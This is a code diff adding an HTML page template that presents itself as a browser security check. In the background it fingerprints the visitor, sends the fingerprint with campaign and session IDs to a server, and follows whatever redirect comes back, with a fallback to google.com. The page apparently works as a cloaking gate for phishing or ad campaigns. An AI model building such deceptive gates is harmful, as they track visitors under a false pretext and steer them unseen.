@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="campaign-id" content="{{ campaign_id }}">
+    <meta name="session-id" content="{{ session_id }}">
+    <title>Security Check...</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            margin: 0;
+            font-size: 16px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <p>Verifying your browser...</p>
+        <p style="font-size: 12px; margin-top: 10px; color: #999;">Please wait a moment while we check your connection.</p>
+    </div>
+
+    <script>
+        /* {{ fingerprint_js }} */
+
+        // Execution Logic
+        (async function() {
+            const cid = document.querySelector('meta[name="campaign-id"]').content;
+            const sid = document.querySelector('meta[name="session-id"]').content;
+            
+            try {
+                // Collect Fingerprint
+                const fp = await FingerprintCollector.collect();
+                
+                // Send to Server
+                const response = await fetch('/v5/verify_fingerprint', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        campaign_id: cid,
+                        session_id: sid,
+                        fingerprint: fp
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.redirect_to) {
+                    window.location.href = data.redirect_to;
+                }
+            } catch (e) {
+                console.error("Verification failed", e);
+                // Fallback
+                window.location.href = "https://www.google.com";
+            }
+        })();
+    </script>
+</body>
+</html>
